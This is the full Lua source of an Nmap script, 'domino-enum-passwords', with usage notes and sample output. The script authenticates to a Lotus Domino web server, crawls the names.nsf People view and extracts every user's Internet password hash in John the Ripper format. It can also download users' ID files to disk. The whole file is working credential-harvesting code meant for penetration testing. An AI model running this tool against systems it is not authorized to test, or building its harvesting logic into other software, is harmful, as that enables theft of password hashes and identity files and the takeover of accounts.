local http = require "http"
local io = require "io"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local table = require "table"

description = [[
Attempts to enumerate the hashed Domino Internet Passwords that are
(by default) accessible by all authenticated users. This script can
also download any Domino ID Files attached to the Person document.
]]

---
-- @usage
-- nmap --script domino-enum-passwords -p 80 <host> --script-args domino-enum-passwords.username='patrik karlsson',domino-enum-passwords.password=secret
--
-- This script attempts to enumerate the password hashes used to authenitcate
-- to the Lotus Domino Web interface. By default, these hashes are accessible
-- to every authenticated user. Passwords are presented in a form suitable for
-- running in John the Ripper. 
--
-- The format can in two forms (http://comments.gmane.org/gmane.comp.security.openwall.john.user/785):
-- 1. Saltless (legacy support?)
-- Example: 355E98E7C7B59BD810ED845AD0FD2FC4
-- John's format name: lotus5
-- 2. Salted (also known as "More Secure Internet Password")
-- Example: (GKjXibCW2Ml6juyQHUoP)
-- John's format name: dominosec
--
-- In addition the script can be used to download
-- any ID files attached to the Person document.
--
-- It appears as if form based authentication is enabled, basic authentication
-- still works. Therefore the script should work in both scenarios. Valid
-- credentials can either be supplied directly using the parameters username 
-- and password or indirectly from results of http-brute or http-form-brute.
--
-- @output
-- PORT     STATE SERVICE REASON
-- 80/tcp   open  http    syn-ack
-- | domino-enum-passwords:  
-- |   Information
-- |     Information retrieved as: "Jim Brass"
-- |   Internet hashes (salted, jtr: --format=DOMINOSEC)
-- |      Jim Brass:(GYvlbOz2idzni5peJUdD)
-- |      Warrick Brown:(GZghNctqAnJgyklUl2ml)
-- |      Gill Grissom:(GyhsteeXTr75YOSwW8mc)
-- |      David Hodges:(GZEJRHqJEVc5IZCsNX0U)
-- |      Ray Langston:(GE18MGVGD/8ftYMFaVlY)
-- |      Greg Sanders:(GHpdG/7FX7iXXlaoY5sj)
-- |      Sara Sidle:(GWzgG0kCQ5qmnqARL3cl)
-- |      Wendy Simms:(G6wooaElHpsvA4TPvSfi)
-- |      Nick Stokes:(Gdo2TJBRj1Ervrs9lPUp)
-- |      Catherine Willows:(GlDc3QP5ePFR38d7lQeM)
-- |   Internet hashes (unsalted, jtr: --format=lotus5)
-- |      Ada Lovelace:355E98E7C7B59BD810ED845AD0FD2FC4
-- |      John Smith:655E98E7C7B59BD810ED845AD0FD2FD4
-- |   ID Files
-- |      Jim Brass ID File has been downloaded (/tmp/id/Jim Brass.id)
-- |      Warrick Brown ID File has been downloaded (/tmp/id/Warrick Brown.id)
-- |      Gill Grissom ID File has been downloaded (/tmp/id/Gill Grissom.id)
-- |      David Hodges ID File has been downloaded (/tmp/id/David Hodges.id)
-- |      Ray Langston ID File has been downloaded (/tmp/id/Ray Langston.id)
-- |      Greg Sanders ID File has been downloaded (/tmp/id/Greg Sanders.id)
-- |      Sara Sidle ID File has been downloaded (/tmp/id/Sara Sidle.id)
-- |      Wendy Simms ID File has been downloaded (/tmp/id/Wendy Simms.id)
-- |      Nick Stokes ID File has been downloaded (/tmp/id/Nick Stokes.id)
-- |      Catherine Willows ID File has been downloaded (/tmp/id/Catherine Willows.id)
-- |   
-- |_  Results limited to 10 results (see domino-enum-passwords.count)
--
--
-- @args domino-enum-passwords.path points to the path protected by authentication
-- @args domino-enum-passwords.hostname sets the host header in case of virtual hosting
-- @args domino-enum-passwords.count the number of internet hashes and id files to fetch.
--       If a negative value is given, all hashes and id files are retrieved (default: 10)
-- @args domino-enum-passwords.idpath the path where downloaded ID files should be saved
--       If not given, the script will only indicate if the ID file is donwloadable or not
-- @args domino-enum-passwords.username Username for HTTP auth, if required
-- @args domino-enum-passwords.password Password for HTTP auth, if required

--
-- Version 0.2
-- Created 07/30/2010 - v0.1 - created by Patrik Karlsson <patrik@cqure.net>
-- Revised 07/31/2010 - v0.2 - add support for downloading ID files
-- Revised 11/25/2010 - v0.3 - added support for separating hash-type <martin@swende.se>

author = "Patrik Karlsson"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"intrusive", "auth"}
dependencies = {"http-brute", "http-form-brute"}


portrule = shortport.port_or_service({80, 443}, {"http","https"}, "tcp", "open")

--- Checks if the <code>path</code> require authentication
--
-- @param host table as received by the action function or the name specified
--             in the hostname argument
-- @param port table as received by the action function
-- @param path against which to check if authentication is required
local function requiresAuth( host, port, path )
	local result = http.get(host, port, "/names.nsf")
	
	if ( result.status == 401 ) then
		return true
	elseif ( result.status == 200 and result.body and result.body:match("<input.-type=[\"]*password[\"]*") ) then
		return true
	end
	return false
end

--- Checks if the credentials are valid and allow access to <code>path</code>
--
-- @param host table as received by the action function or the name specified
--             in the hostname argument
-- @param port as recieved by the action method
-- @param path the patch against which to validate the credentials
-- @param user the username used for authentication
-- @param pass the password used for authentication
-- @return true on valid access, false on failure
local function isValidCredential( host, port, path, user, pass )
	-- we need to supply the no_cache directive, or else the http library
	-- incorrectly tells us that the authentication was successfull
	local result = http.get( host, port, path, { auth = { username = user, password = pass }, no_cache = true })
	
	if ( result.status == 401 ) then
		return false
	end
	return true
end

--- Retrieves all uniq links in a pages
--
-- @param body the html content of the recieved page
-- @param filter a filter to use for additional link filtering
-- @param links [optional] table containing previousy retrieved links
-- @return links table containing retrieved links
local function getLinks( body, filter, links )
	local tmp = {}
	local links = links or {}
	local filter = filter or ".*"
	
	if ( not(body) ) then return end
	for _, v in ipairs( links ) do
		tmp[v] = true
	end

	for link in body:gmatch("<a href=\"([^\"]+)\"") do
		-- use link as key in order to remove duplicates
		if ( link:match(filter)) then
			tmp[link] = true
		end
	end

	links = {}
	for k, _ in pairs(tmp) do
 		table.insert(links, k)
	end
	
	return links
end

--- Retrieves the "next page" path from the returned document
--
-- @param body the html content of the recieved page
-- @return link to next page
local function getPager( body )
	return body:match("<form.+action=\"(.+%?ReadForm)&" )
end

--- Retrieves the username and passwords for a user
--
-- @param body the html content of the recieved page
-- @return full_name the full name of the user
-- @return password the password hash for the user
local function getUserDetails( body )

	-- retrieve the details
	local full_name = body:match("<input name=\"FullName\".-value=\"(.-)\">")
	local http_passwd = body:match("<input name=\"HTTPPassword\".-value=\"(.-)\">")
	local dsp_http_passwd = body:match("<input name=\"dspHTTPPassword\".-value=\"(.-)\">")
	local id_file = body:match("<a href=\"(.-UserID)\">")
	
	-- Remove the parenthesis around the password
	http_passwd = http_passwd:sub(2,-2)
	-- In case we have more than one full name, return only the last
	full_name = stdnse.strsplit(";%s*", full_name)
	full_name = full_name[#full_name]

	return { fullname = full_name, passwd = ( http_passwd or dsp_http_passwd ), idfile = id_file }
end

--- Saves the ID file to disk
--
-- @param filename string containing the name and full path to the file
-- @param data contains the data 
-- @return status true on success, false on failure
-- @return err string containing error message if status is false
local function saveIDFile( filename, data )
	local f = io.open( filename, "w")
	if ( not(f) ) then
		return false, ("Failed to open file (%s)"):format(filename)
	end
	if ( not(f:write( data ) ) ) then
		return false, ("Failed to write file (%s)"):format(filename)
	end
	f:close()

	return true
end


action = function(host, port)

	local path = "/names.nsf"
	local download_path = stdnse.get_script_args('domino-enum-passwords.idpath')
	local vhost= stdnse.get_script_args('domino-enum-passwords.hostname')
	local user = stdnse.get_script_args('domino-enum-passwords.username')
	local pass = stdnse.get_script_args('domino-enum-passwords.password')
	local creds, pos, pager
	local links, result, hashes,legacyHashes, id_files = {}, {}, {}, {},{}
	local chunk_size = 30
	local max_fetch = stdnse.get_script_args('domino-enum-passwords.count') and tonumber(stdnse.get_script_args('domino-enum-passwords.count')) or 10
	local http_response
	
	if ( nmap.registry['credentials'] and nmap.registry['credentials']['http'] ) then
		creds = nmap.registry['credentials']['http']
	end
	
	-- authentication required?
	if ( requiresAuth( vhost or host, port, path ) ) then
		if ( not(user) and not(creds) ) then
			return "  \n  ERROR: No credentials supplied (see domino-enum-passwords.username and domino-enum-passwords.password)"
		end
		
		-- A user was provided, attempt to authenticate
		if ( user ) then
			if (not(isValidCredential( vhost or host, port, path, user, pass )) ) then
				return "  \n  ERROR: The provided credentials where invalid"
			end
		elseif ( creds ) then
			for _, cred in pairs(creds) do
				if ( isValidCredential( vhost or host, port, path, cred.username, cred.password ) ) then
					user = cred.username
					pass = cred.password
					break
				end
			end
		end
	end
	
	if ( not(user) and not(pass) ) then
		return "  \n  ERROR: No valid credentials were found (see domino-enum-passwords.username and domino-enum-passwords.password)"
	end

	path = "/names.nsf/People?OpenView"
	http_response = http.get( vhost or host, port, path, { auth = { username = user, password = pass }, no_cache = true })
	pager = getPager( http_response.body )
	if ( not(pager) ) then
		if ( http_response.body and 
			 http_response.body:match(".*<input type=\"submit\".* value=\"Sign In\">.*" ) ) then
			return "  \n  ERROR: Failed to authenticate"
		else
			return "  \n  ERROR: Failed to process results"
		end
	end
	pos = 1
	
	-- first collect all links
	while( true ) do
		path = pager .. "&Start=" .. pos
		http_response = http.get( vhost or host, port, path, { auth = { username = user, password = pass }, no_cache = true })	

		if ( http_response.status == 200 ) then
			local size = #links
			links = getLinks( http_response.body, "%?OpenDocument", links )
			-- No additions were made
			if ( size == #links ) then
				break
			end
		end

		if ( max_fetch > 0 and max_fetch < #links ) then
			break
		end
		
		pos = pos + chunk_size
	end
	
	for _, link in ipairs(links) do
		stdnse.print_debug(2, "Fetching link: %s", link)
		http_response = http.get( vhost or host, port, link, { auth = { username = user, password = pass }, no_cache = true })	
		local u_details = getUserDetails( http_response.body )

		if ( max_fetch > 0 and (#hashes+#legacyHashes)>= max_fetch ) then
			break
		end

		if ( u_details.fullname and u_details.passwd and #u_details.passwd > 0 ) then
			stdnse.print_debug(2, "Found Internet hash for: %s:%s", u_details.fullname, u_details.passwd)
			-- Old type are 32 bytes, new are 20
			if #u_details.passwd == 32 then
				table.insert( legacyHashes, ("%s:%s"):format(u_details.fullname, u_details.passwd))
			else
				table.insert( hashes, ("%s:(%s)"):format(u_details.fullname, u_details.passwd))
			end
		end
		
		if ( u_details.idfile ) then
			stdnse.print_debug(2, "Found ID file for user: %s", u_details.fullname)
			if ( download_path ) then
				stdnse.print_debug(2, "Downloading ID file for user: %s", u_details.full_name)
				http_response = http.get( vhost or host, port, u_details.idfile, { auth = { username = user, password = pass }, no_cache = true })	

				if ( http_response.status == 200 ) then
					local filename = download_path .. "/" .. stdnse.filename_escape(u_details.fullname .. ".id")
					local status, err = saveIDFile( filename, http_response.body )
					if ( status ) then
						table.insert( id_files, ("%s ID File has been downloaded (%s)"):format(u_details.fullname, filename) )
					else
						table.insert( id_files, ("%s ID File was not saved (error: %s)"):format(u_details.fullname, err ) )
					end
				else
					table.insert( id_files, ("%s ID File was not saved (error: unexpected response from server)"):format( u_details.fullname ) )
				end
			else
				table.insert( id_files, ("%s has ID File available for download"):format(u_details.fullname) )
			end
		end
	end
	
	if( #hashes + #legacyHashes > 0) then
		table.insert( result, { name = "Information", [1] = ("Information retrieved as: \"%s\""):format(user) } )
	end
	
	if ( #hashes ) then
		hashes.name = "Internet hashes (salted, jtr: --format=DOMINOSEC)"
		table.insert( result, hashes )
	end
	if (#legacyHashes ) then
		legacyHashes.name = "Internet hashes (unsalted, jtr: --format=lotus5)"
		table.insert( result, legacyHashes )
	end

	if ( #id_files ) then
		id_files.name = "ID Files"
		table.insert( result, id_files )
	end
	
	local result = stdnse.format_output(true, result)
	
	if ( max_fetch > 0 ) then
		result = result .. ("  \n  Results limited to %d results (see domino-enum-passwords.count)"):format(max_fetch)
	end
	
	return result
	
end
